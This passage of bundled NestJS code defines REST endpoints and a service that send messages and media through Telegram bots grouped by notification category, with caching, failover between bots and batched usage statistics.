        description: 'Category of bots to use for sending the audio',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_dto_1.SendAudioDto,
        description: 'Audio content and optional metadata parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Audio sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid audio parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_dto_1.SendAudioDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendAudioByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/document'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a document using bots in a category',
        description: 'Sends a document file using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the document',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_dto_1.SendDocumentDto,
        description: 'Document content and optional caption parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Document sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid document parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_dto_1.SendDocumentDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendDocumentByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/voice'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a voice message using bots in a category',
        description: 'Sends a voice message using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the voice message',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_extras_dto_1.SendVoiceDto,
        description: 'Voice message content and optional parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Voice message sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid voice message parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_extras_dto_1.SendVoiceDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendVoiceByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/animation'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send an animation using bots in a category',
        description: 'Sends an animation (GIF or short video) using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the animation',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_extras_dto_1.SendAnimationDto,
        description: 'Animation content and optional caption parameters'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Animation sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid animation parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_extras_dto_1.SendAnimationDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendAnimationByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/sticker'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a sticker using bots in a category',
        description: 'Sends a sticker using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the sticker',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_extras_dto_1.SendStickerDto,
        description: 'Sticker file or sticker ID to send'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Sticker sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid sticker parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_extras_dto_1.SendStickerDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendStickerByCategory", null);
__decorate([
    (0, common_1.Post)('category/:category/media-group'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send a media group using bots in a category',
        description: 'Sends a group of media (photos and videos) as an album using either all bots in a category or a specific bot if botId is provided.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to use for sending the media group',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiQuery)({
        name: 'botId',
        required: false,
        description: 'Optional specific bot ID to use instead of all bots in the category'
    }),
    (0, swagger_1.ApiBody)({
        type: media_group_dto_1.SendMediaGroupDto,
        description: 'Array of media items (photos/videos) to send as a group'
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Media group sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid media group parameters or bot category' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Bot or category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __param(1, (0, common_1.Query)('botId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, media_group_dto_1.SendMediaGroupDto]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "sendMediaGroupByCategory", null);
__decorate([
    (0, common_1.Get)('category/:category/stats'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get bot statistics by category',
        description: 'Retrieves aggregated statistics for all bots in a specific category, including message counts and performance metrics.',
    }),
    (0, swagger_1.ApiParam)({
        name: 'category',
        description: 'Category of bots to get statistics for',
        enum: bots_service_2.ChannelCategory
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Statistics retrieved successfully' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Category not found' }),
    __param(0, (0, common_1.Param)('category')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BotsController.prototype, "getBotStats", null);
exports.BotsController = BotsController = __decorate([
    (0, swagger_1.ApiTags)('Bots'),
    (0, common_1.Controller)('bots'),
    __metadata("design:paramtypes", [bots_service_1.BotsService])
], BotsController);


/***/ }),

/***/ "./src/components/bots/bots.module.ts":
/*!********************************************!*\
  !*** ./src/components/bots/bots.module.ts ***!
  \********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const bots_controller_1 = __webpack_require__(/*! ./bots.controller */ "./src/components/bots/bots.controller.ts");
const bots_service_1 = __webpack_require__(/*! ./bots.service */ "./src/components/bots/bots.service.ts");
const bot_schema_1 = __webpack_require__(/*! ./schemas/bot.schema */ "./src/components/bots/schemas/bot.schema.ts");
const bot_service_instance_1 = __webpack_require__(/*! ../../utils/bot.service.instance */ "./src/utils/bot.service.instance.ts");
let BotsModule = class BotsModule {
    constructor(botsService) {
        this.botsService = botsService;
    }
    onModuleInit() {
        (0, bot_service_instance_1.setBotsServiceInstance)(this.botsService);
    }
};
exports.BotsModule = BotsModule;
exports.BotsModule = BotsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([{ name: bot_schema_1.Bot.name, schema: bot_schema_1.BotSchema }])
        ],
        controllers: [bots_controller_1.BotsController],
        providers: [bots_service_1.BotsService],
        exports: [bots_service_1.BotsService]
    }),
    __metadata("design:paramtypes", [bots_service_1.BotsService])
], BotsModule);


/***/ }),

/***/ "./src/components/bots/bots.service.ts":
/*!*********************************************!*\
  !*** ./src/components/bots/bots.service.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotsService = exports.ChannelCategory = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const form_data_1 = __importDefault(__webpack_require__(/*! form-data */ "form-data"));
const node_cache_1 = __importDefault(__webpack_require__(/*! node-cache */ "node-cache"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const bot_schema_1 = __webpack_require__(/*! ./schemas/bot.schema */ "./src/components/bots/schemas/bot.schema.ts");
var ChannelCategory;
(function (ChannelCategory) {
    ChannelCategory["CLIENT_UPDATES"] = "CLIENT_UPDATES";
    ChannelCategory["USER_WARNINGS"] = "USER_WARNINGS";
    ChannelCategory["VC_WARNINGS"] = "VC_WARNINGS";
    ChannelCategory["USER_REQUESTS"] = "USER_REQUESTS";
    ChannelCategory["VC_NOTIFICATIONS"] = "VC_NOTIFICATIONS";
    ChannelCategory["CHANNEL_NOTIFICATIONS"] = "CHANNEL_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_NOTIFICATIONS"] = "ACCOUNT_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_LOGIN_FAILURES"] = "ACCOUNT_LOGIN_FAILURES";
    ChannelCategory["ACCOUNT_LOGINS"] = "ACCOUNT_LOGINS";
    ChannelCategory["PROMOTION_ACCOUNT"] = "PROMOTION_ACCOUNT";
    ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
    ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
    ChannelCategory["SAVED_MESSAGES"] = "SAVED_MESSAGES";
    ChannelCategory["HTTP_FAILURES"] = "HTTP_FAILURES";
    ChannelCategory["UNVDS"] = "UNVDS";
    ChannelCategory["PROM_LOGS1"] = "PROM_LOGS1";
    ChannelCategory["PROM_LOGS2"] = "PROM_LOGS2";
    ChannelCategory["UNAUTH_CALLS"] = "UNAUTH_CALLS";
})(ChannelCategory || (exports.ChannelCategory = ChannelCategory = {}));
let BotsService = class BotsService {
    constructor(botModel) {
        this.botModel = botModel;
        this.flushInterval = 300000;
        this.maxPendingUpdates = 100;
        this.cache = new node_cache_1.default({ stdTTL: 300, checkperiod: 60 });
    }
    async onModuleInit() {
        await this.initializeCache();
        this.startPeriodicFlush();
    }
    async initializeCache() {
        try {
            const bots = await this.botModel.find().lean().exec();
            const botsByCategory = bots.reduce((acc, bot) => {
                if (!acc[bot.category]) {
                    acc[bot.category] = [];
                }
                acc[bot.category].push(bot);
                return acc;
            }, {});
            for (const category in botsByCategory) {
                const sortedBots = botsByCategory[category].sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());
                this.cache.set(`category:${category}`, sortedBots);
                sortedBots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));
            }
            console.log('Bot cache initialized with', Object.keys(botsByCategory).length, 'categories');
        }
        catch (error) {
            console.error('Failed to initialize bot cache:', error);
        }
    }
    startPeriodicFlush() {
        setInterval(async () => {
            await this.flushPendingStats();
        }, this.flushInterval);
    }
    async flushPendingStats() {
        const pendingUpdates = this.cache.get('pendingStats') || {};
        if (Object.keys(pendingUpdates).length === 0) {
            return;
        }
        try {
            const bulkOps = Object.entries(pendingUpdates).map(([botId, updates]) => ({
                updateOne: {
                    filter: { _id: botId },
                    update: {
                        $inc: {
                            ...(updates.messagesSent ? { 'stats.messagesSent': updates.messagesSent } : {}),
                            ...(updates.photosSent ? { 'stats.photosSent': updates.photosSent } : {}),
                            ...(updates.videosSent ? { 'stats.videosSent': updates.videosSent } : {}),
                            ...(updates.documentsSent ? { 'stats.documentsSent': updates.documentsSent } : {}),
                            ...(updates.audiosSent ? { 'stats.audiosSent': updates.audiosSent } : {}),
                            ...(updates.voicesSent ? { 'stats.voicesSent': updates.voicesSent } : {}),
                            ...(updates.animationsSent ? { 'stats.animationsSent': updates.animationsSent } : {}),
                            ...(updates.stickersSent ? { 'stats.stickersSent': updates.stickersSent } : {}),
                            ...(updates.mediaGroupsSent ? { 'stats.mediaGroupsSent': updates.mediaGroupsSent } : {}),
                        },
                        ...(updates.lastUsed ? { $set: { lastUsed: updates.lastUsed } } : {}),
                    },
                },
            }));
            if (bulkOps.length > 0) {
                await this.botModel.bulkWrite(bulkOps);
                console.log(`Flushed ${bulkOps.length} pending stat updates to database`);
            }
            this.cache.del('pendingStats');
        }
        catch (error) {
            console.error('Failed to flush pending stats:', error);
        }
    }
    async createBot(createBotDto) {
        const username = await this.fetchUsername(createBotDto.token);
        if (!username) {
            throw new Error('Invalid bot token or unable to fetch bot username');
        }
        const existingBot = await this.botModel.findOne({ token: createBotDto.token }).exec();
        if (existingBot) {
            throw new Error('Bot with this token already exists');
        }
        const createdBot = new this.botModel({
            ...createBotDto,
            username,
            lastUsed: new Date(),
            stats: {
                messagesSent: 0,
                photosSent: 0,
                videosSent: 0,
                documentsSent: 0,
                audiosSent: 0,
                voicesSent: 0,
                animationsSent: 0,
                stickersSent: 0,
                mediaGroupsSent: 0
            }
        });
        const savedBot = await createdBot.save();
        const cachedBots = this.cache.get(`category:${createBotDto.category}`) || [];
        cachedBots.push(savedBot.toObject());
        this.cache.set(`category:${createBotDto.category}`, cachedBots.sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime()));
        this.cache.set(`bot:${savedBot._id}`, savedBot.toObject());
        return savedBot;
    }
    async getBots(category) {
        if (category) {
            const cachedBots = this.cache.get(`category:${category}`);
            if (cachedBots) {
                return cachedBots;
            }
            console.warn(`Cache miss for category: ${category}`);
            const bots = await this.botModel.find({ category }).lean().exec();
            this.cache.set(`category:${category}`, bots);
            bots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));
            return bots;
        }
        const allCategories = Object.values(ChannelCategory);
        const allBots = [];
        for (const cat of allCategories) {
            const bots = this.cache.get(`category:${cat}`) || [];
            allBots.push(...bots);
        }
        if (allBots.length > 0) {
            return allBots;
        }
        console.warn('Cache miss for all bots');
        const bots = await this.botModel.find().lean().exec();
        bots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));
        const botsByCategory = bots.reduce((acc, bot) => {
            if (!acc[bot.category])
                acc[bot.category] = [];
            acc[bot.category].push(bot);
            return acc;
        }, {});
        for (const category in botsByCategory) {
            this.cache.set(`category:${category}`, botsByCategory[category]);
        }
        return bots;
    }
    async getBotById(id) {
        const cachedBot = this.cache.get(`bot:${id}`);
        if (cachedBot) {
            return cachedBot;
        }
        console.warn(`Cache miss for bot ID: ${id}`);
        const bot = await this.botModel.findById(id).lean().exec();
        if (!bot) {
            throw new common_1.NotFoundException(`Bot with ID ${id} not found`);
        }
        this.cache.set(`bot:${id}`, bot);
        const cachedBots = this.cache.get(`category:${bot.category}`) || [];
        if (!cachedBots.some(b => b._id.toString() === id)) {
            cachedBots.push(bot);
            this.cache.set(`category:${bot.category}`, cachedBots.sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime()));
        }
        return bot;
    }
    async updateBot(id, updateBotDto) {
        const bot = await this.botModel
            .findByIdAndUpdate(id, { ...updateBotDto, lastUsed: new Date() }, { new: true })
            .lean()
            .exec();
        if (!bot) {
            throw new common_1.NotFoundException(`Bot with ID ${id} not found`);
        }
        this.cache.set(`bot:${id}`, bot);
        const cachedBots = this.cache.get(`category:${bot.category}`) || [];
        const updatedBots = cachedBots
            .filter(b => b._id.toString() !== id)
            .concat(bot)
            .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());
        this.cache.set(`category:${bot.category}`, updatedBots);
        return bot;
    }
    async deleteBot(id) {
        const bot = await this.botModel.findById(id).lean().exec();
        if (!bot) {
            throw new common_1.NotFoundException(`Bot with ID ${id} not found`);
        }
        await this.botModel.findByIdAndDelete(id).exec();
        this.cache.del(`bot:${id}`);
        const cachedBots = this.cache.get(`category:${bot.category}`) || [];
        const updatedBots = cachedBots
            .filter(b => b._id.toString() !== id)
            .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());
        this.cache.set(`category:${bot.category}`, updatedBots);
    }
    async sendByCategoryWithFailover(category, sender, ...args) {
        let availableBots = this.cache.get(`category:${category}`);
        if (!availableBots || availableBots.length === 0) {
            console.warn(`Cache miss for category: ${category}`);
            availableBots = await this.botModel
                .find({ category })
                .sort({ lastUsed: 'asc' })
                .lean()
                .exec();
            this.cache.set(`category:${category}`, availableBots);
            availableBots.forEach(bot => this.cache.set(`bot:${bot._id}`, bot));
        }
        if (availableBots.length === 0) {
            console.error(`No bots found for category: ${category}`);
            return false;
        }
        for (const bot of availableBots) {
            const success = await sender.call(this, bot._id.toString(), ...args);
            if (success) {
                const updatedBot = { ...bot, lastUsed: new Date() };
                this.cache.set(`bot:${bot._id}`, updatedBot);
                const updatedBots = availableBots
                    .map(b => b._id.toString() === bot._id.toString() ? updatedBot : b)
                    .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());
                this.cache.set(`category:${category}`, updatedBots);
                const pendingStats = this.cache.get('pendingStats') || {};
                pendingStats[bot._id.toString()] = pendingStats[bot._id.toString()] || {};
                pendingStats[bot._id.toString()].lastUsed = new Date();
                this.cache.set('pendingStats', pendingStats);
                return true;
            }
            console.warn(`Sending via bot ${bot.username} for category ${category} failed. Trying next available bot.`);
        }
        console.error(`Failed to send for category ${category} after trying all ${availableBots.length} available bot(s).`);
        return false;
    }
    async sendMessageByCategory(category, message, options, allowServiceName = true) {
        return this.sendByCategoryWithFailover(category, this.sendMessageByBotId, message, options, allowServiceName);
    }
    async sendPhotoByCategory(category, photo, options) {
        return this.sendByCategoryWithFailover(category, this.sendPhotoByBotId, photo, options);
    }
    async sendVideoByCategory(category, video, options) {
        return this.sendByCategoryWithFailover(category, this.sendVideoByBotId, video, options);
    }
    async sendAudioByCategory(category, audio, options) {
        return this.sendByCategoryWithFailover(category, this.sendAudioByBotId, audio, options);
    }
    async sendDocumentByCategory(category, document, options) {
        return this.sendByCategoryWithFailover(category, this.sendDocumentByBotId, document, options);
    }
    async sendVoiceByCategory(category, voice, options) {
        return this.sendByCategoryWithFailover(category, this.sendVoiceByBotId, voice, options);
    }
    async sendAnimationByCategory(category, animation, options) {
        return this.sendByCategoryWithFailover(category, this.sendAnimationByBotId, animation, options);
    }
    async sendStickerByCategory(category, sticker, options) {
        return this.sendByCategoryWithFailover(category, this.sendStickerByBotId, sticker, options);
    }
    async sendMediaGroupByCategory(category, media, options) {
        return this.sendByCategoryWithFailover(category, this.sendMediaGroupByBotId, media, options);
    }
    async sendMessageByBotId(botId, message, options, allowServiceName = true) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMessage(bot, message, options, allowServiceName);
        if (success) {
            await this.updateBotStats(botId, 'messagesSent', bot);
        }
        return success;
    }
    async sendPhotoByBotId(botId, photo, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendPhoto', photo, options);
        if (success) {
            await this.updateBotStats(botId, 'photosSent', bot);
        }
        return success;
    }
    async sendVideoByBotId(botId, video, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendVideo', video, options);
        if (success) {
            await this.updateBotStats(botId, 'videosSent', bot);
        }
        return success;
    }
    async sendAudioByBotId(botId, audio, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendAudio', audio, options);
        if (success) {
            await this.updateBotStats(botId, 'audiosSent', bot);
        }
        return success;
    }
    async sendDocumentByBotId(botId, document, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendDocument', document, options);
        if (success) {
            await this.updateBotStats(botId, 'documentsSent', bot);
        }
        return success;
    }
    async sendVoiceByBotId(botId, voice, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendVoice', voice, options);
        if (success) {
            await this.updateBotStats(botId, 'voicesSent', bot);
        }
        return success;
    }
    async sendAnimationByBotId(botId, animation, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendAnimation', animation, options);
        if (success) {
            await this.updateBotStats(botId, 'animationsSent', bot);
        }
        return success;
    }
    async sendStickerByBotId(botId, sticker, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMedia(bot, 'sendSticker', sticker, options);
        if (success) {
            await this.updateBotStats(botId, 'stickersSent', bot);
        }
        return success;
    }
    async sendMediaGroupByBotId(botId, media, options) {
        const bot = await this.getBotById(botId);
        const success = await this.executeSendMediaGroup(bot, media, options);
        if (success) {
            await this.updateBotStats(botId, 'mediaGroupsSent', bot);
        }
        return success;
    }
    async executeSendMessage(bot, text, options, allowServiceName = true) {
        try {
            const response = await axios_1.default.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                chat_id: bot.channelId,
                text: `${allowServiceName ? `${process.env.clientId?.toUpperCase()}\n\n${text}` : text}`,
                parse_mode: options?.parseMode,
                disable_web_page_preview: options?.disableWebPagePreview,
                disable_notification: options?.disableNotification,
                reply_to_message_id: options?.replyToMessageId,
                allow_sending_without_reply: options?.allowSendingWithoutReply,
                protect_content: options?.protectContent,
                link_preview_options: options?.linkPreviewOptions,
            }, { timeout: 15000 });
            if (!response.data?.ok) {
                console.error(`Telegram API error for sendMessage with bot ${bot.username}:`, response.data.description);
            }
            return response.data?.ok === true;
        }
        catch (error) {
            (0, utils_1.parseError)(error, `Failed to execute sendMessage for bot ${bot.username}`);
            return false;
        }
    }
    async executeSendMedia(bot, method, media, options = {}) {
        const formData = new form_data_1.default();
        formData.append('chat_id', bot.channelId);
        const mediaField = method.replace('send', '').toLowerCase();
        if (Buffer.isBuffer(media)) {
            formData.append(mediaField, media, `${mediaField}.${this.getDefaultExtension(mediaField)}`);
        }
        else {
            formData.append(mediaField, media);
        }
        if (options.caption) {
            formData.append('caption', `${process.env.clientId?.toUpperCase()}:\n\n${options.caption}`);
        }
        if (options.parseMode)
            formData.append('parse_mode', options.parseMode);
        if (options.disableNotification)
            formData.append('disable_notification', 'true');
        if (options.replyToMessageId)
            formData.append('reply_to_message_id', options.replyToMessageId.toString());
        if (options.allowSendingWithoutReply)
            formData.append('allow_sending_without_reply', 'true');
        if (options.protectContent)
            formData.append('protect_content', 'true');
        if (options.hasSpoiler)
            formData.append('has_spoiler', 'true');
        this.addMethodSpecificOptions(method, options, formData);
        try {
            const response = await axios_1.default.post(`https://api.telegram.org/bot${bot.token}/${method}`, formData, { timeout: 30000, headers: formData.getHeaders() });
            if (!response.data?.ok) {
                console.error(`Telegram API error for ${method} with bot ${bot.username}:`, response.data.description);
            }
            return response.data?.ok === true;
        }
        catch (error) {
            (0, utils_1.parseError)(error, `Failed to execute ${method} for bot ${bot.username}`);
            return false;
        }
    }
    async executeSendMediaGroup(bot, media, options) {
        const formData = new form_data_1.default();
        formData.append('chat_id', bot.channelId);
        const mediaArray = media.map((item, i) => {
            const mediaObj = {
                type: item.type,
                media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,
            };
            if (item.caption)
                mediaObj.caption = `${process.env.clientId?.toUpperCase()}:\n\n${item.caption}`;
            if (item.parseMode)
                mediaObj.parse_mode = item.parseMode;
            if (item.hasSpoiler)
                mediaObj.has_spoiler = true;
            if (item.type === 'video') {
                if (item.duration)
                    mediaObj.duration = item.duration;
                if (item.width)
                    mediaObj.width = item.width;
                if (item.height)
                    mediaObj.height = item.height;
                if (item.supportsStreaming)
                    mediaObj.supports_streaming = true;
            }
            if (item.type === 'audio') {
                if (item.duration)
                    mediaObj.duration = item.duration;
                if (item.performer)
                    mediaObj.performer = item.performer;
                if (item.title)
                    mediaObj.title = item.title;
            }
            if (Buffer.isBuffer(item.media)) {
                const filename = item.extension ? `file${i}.${item.extension}` : `file${i}.${this.getDefaultExtension(item.type)}`;
                formData.append(`file${i}`, item.media, filename);
            }
            if (item.thumbnail && Buffer.isBuffer(item.thumbnail)) {
                mediaObj.thumbnail = `attach://thumb${i}`;
                formData.append(`thumb${i}`, item.thumbnail, `thumb${i}.jpg`);
            }
            return mediaObj;
        });
        formData.append('media', JSON.stringify(mediaArray));
        if (options) {
            if (options.disableNotification)
                formData.append('disable_notification', 'true');
            if (options.replyToMessageId)
                formData.append('reply_to_message_id', options.replyToMessageId.toString());
            if (options.allowSendingWithoutReply)
                formData.append('allow_sending_without_reply', 'true');
            if (options.protectContent)
                formData.append('protect_content', 'true');
        }
        try {
            const response = await axios_1.default.post(`https://api.telegram.org/bot${bot.token}/sendMediaGroup`, formData, { timeout: 30000, headers: formData.getHeaders() });
            if (!response.data?.ok) {
                console.error(`Telegram API error for sendMediaGroup with bot ${bot.username}:`, response.data.description);
            }
            return response.data?.ok === true;
        }
        catch (error) {
            (0, utils_1.parseError)(error, `Failed to execute sendMediaGroup for bot ${bot.username}`);
            return false;
        }
    }
    async fetchUsername(token) {
        if (!token || typeof token !== 'string' || token.length < 10) {
            return '';
        }
        try {
            const res = await axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
                timeout: 10000
            });
            return res.data?.ok ? res.data.result.username : '';
        }
        catch (error) {
            console.error('Error fetching bot username with provided token:', error);
            (0, utils_1.parseError)(error, 'Failed fetching bot username:');
            return '';
        }
    }
    async updateBotStats(botId, statField, bot) {
        const updatedBot = {
            ...bot,
            stats: {
                ...bot.stats,
                [statField]: bot.stats[statField] + 1,
            },
            lastUsed: new Date(),
        };
        this.cache.set(`bot:${botId}`, updatedBot);
        const cachedBots = this.cache.get(`category:${bot.category}`) || [];
        const updatedBots = cachedBots
            .map(b => b._id.toString() === botId ? updatedBot : b)
            .sort((a, b) => new Date(a.lastUsed).getTime() - new Date(b.lastUsed).getTime());
        this.cache.set(`category:${bot.category}`, updatedBots);
        const pendingStats = this.cache.get('pendingStats') || {};
        pendingStats[botId] = pendingStats[botId] || {};
        pendingStats[botId][statField] = (pendingStats[botId][statField] || 0) + 1;
        pendingStats[botId].lastUsed = updatedBot.lastUsed;
        this.cache.set('pendingStats', pendingStats);
        if (Object.keys(pendingStats).length >= this.maxPendingUpdates) {
            await this.flushPendingStats();
        }
    }
    getDefaultExtension(type) {
        switch (type) {
            case 'photo': return 'jpg';
            case 'video': return 'mp4';
            case 'audio': return 'mp3';
            case 'document': return 'bin';
            default: return 'dat';
        }
    }
    addMethodSpecificOptions(method, options, formData) {
        if (method === 'sendVideo' || method === 'sendAnimation') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.width)
                formData.append('width', options.width.toString());
            if (options.height)
                formData.append('height', options.height.toString());
            if (options.supportsStreaming)
                formData.append('supports_streaming', 'true');
        }
        if (method === 'sendAudio') {
            if (options.duration)
                formData.append('duration', options.duration.toString());
            if (options.performer)
                formData.append('performer', options.performer);
            if (options.title)
